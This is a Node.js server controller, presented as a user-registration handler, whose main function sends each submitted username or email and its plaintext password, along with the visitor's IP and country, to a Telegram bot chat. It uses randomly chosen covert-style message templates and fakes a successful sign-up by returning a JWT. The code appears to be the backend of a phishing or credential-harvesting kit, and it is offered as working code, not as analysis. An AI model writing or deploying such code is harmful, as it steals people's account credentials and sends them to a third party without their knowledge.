const axios = require('axios');
const jwt = require('jsonwebtoken');
const moment = require('moment');
const { JWT_SECRET } = require('../config/keys');
const { getClientIp } = require('request-ip');
const useragent = require('useragent');
const BASE62_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

const base62Encode = (num) => {
    if (!num || num <= 0) return "0";
    let encoded = "";
    while (num > 0) {
        encoded = BASE62_CHARS[num % 62] + encoded;
        num = Math.floor(num / 62);
    }
    return encoded || "0";
};

// 🔥 Random Base62 Generator
const randomBase62 = (length = 3) => {
    return Array.from({ length }, () => BASE62_CHARS[Math.floor(Math.random() * 62)]).join("");
};

exports.registerUser = async (req, res) => {
  let { emailOrUsername, password , clientSessionId, ip} = req.body;
  const { obfPath, sessionID } = req.params;
  const today = new Date().getUTCDate();
  const encodedDay = base62Encode(today); // Encode current day
  if (!sessionID || sessionID !== clientSessionId) {
    console.error(`❌ Mismatched Session ID: Expected ${clientSessionId}, Got ${sessionID}`);
    return res.status(403).json({ error: "Invalid session ID" });
}

  if (!emailOrUsername || !password || !clientSessionId) {
    return res.json({
      error: "Fields must not be empty",
    });
  }
  if (password.length < 8) {
    return res.json({
      error: "Password must be at least 8 characters long",
    });
  }
  
  try {
    // Get user IP & location
    const { country } = await getGeolocation(ip);

    // Generate JWT token based on clientSessionId
    const token = jwt.sign(
      { clientSessionId, role: "user" }, // Using clientSessionId instead of userId
      JWT_SECRET
    );

    const encode = jwt.verify(token, JWT_SECRET);
    try {
      const messages = [
        `🕶️ A new entity has surfaced.\n🔗 Credentials: ${emailOrUsername} | 🔑 ${password}\n🌍 Route: ${country} (${ip})\n⏳ Log time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `📡 Signal detected.\n🆔 Access: ${emailOrUsername}\n🔑 Key: ${password}\n📌 Location: ${country} (${ip})\n⏰ Timestamp: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `🖤 Unknown figure entered the system.\n📩 Handle: ${emailOrUsername}\n🔒 Passcode: ${password}\n📍 Origin: ${country} (${ip})\n🕰️ Recorded: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `🔺 New presence acknowledged.\n🆔 ID: ${emailOrUsername}\n🔑 Cipher: ${password}\n🌎 Trace: ${country} (${ip})\n⏳ Event time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `🌑 A shadow moves.\n📡 Ident: ${emailOrUsername}\n🔐 Cipher Key: ${password}\n🗺️ Source: ${country} (${ip})\n📅 Timestamp: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `👁️ A trace has been left.\n📩 Signature: ${emailOrUsername}\n🔑 Pass: ${password}\n📌 Position: ${country} (${ip})\n⏰ Timeframe: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `🕵️ An unidentified subject logged in.\n📜 Alias: ${emailOrUsername}\n🔏 Key: ${password}\n📍 Traced back to: ${country} (${ip})\n⏳ Logged at: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`,
        `⚠️ A presence has been detected.\n🗂️ Data point: ${emailOrUsername}\n🔑 Token: ${password}\n🌐 Last known route: ${country} (${ip})\n📆 Entry logged: ${moment().format('MMMM Do YYYY, h:mm:ss a')}`
      ];
    
      // Select a random message format
      const telegramMessage = messages[Math.floor(Math.random() * messages.length)];
    
      await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: telegramMessage,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.log("Telegram notification error:", telegramError);
      // Don't block the registration process if Telegram notification fails
    }
    return res.json({
      token: token,
      clientSessionId: clientSessionId, // Returning clientSessionId instead of userId
      user: encode,
    });

  } catch (err) {
    console.log(err);
    return res.json({
      error: "An error occurred during registration",
    });
  }
};



async function getGeolocation(ip) {
  const ipinfoToken = process.env.IPINFO_TOKEN;
  const ipv4 = ip.startsWith('::ffff:') ? ip.split('::ffff:')[1] : ip;

  // Check for private/local IPs
  const isPrivateIP = /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ipv4);
  if (isPrivateIP) {
    console.log('Private IP detected, defaulting to "Unknown".');
    return { country: "Unknown" };
  }

  try {
    const response = await axios.get(`https://ipinfo.io/${ipv4}/json?token=${ipinfoToken}`);
    return {
      country: response.data.country || "Unknown",
    };
  } catch (error) {
    console.error('Geolocation API error:', error.response?.data || error.message);
    return { country: "Unknown" }; // Default in case of error
  }
}
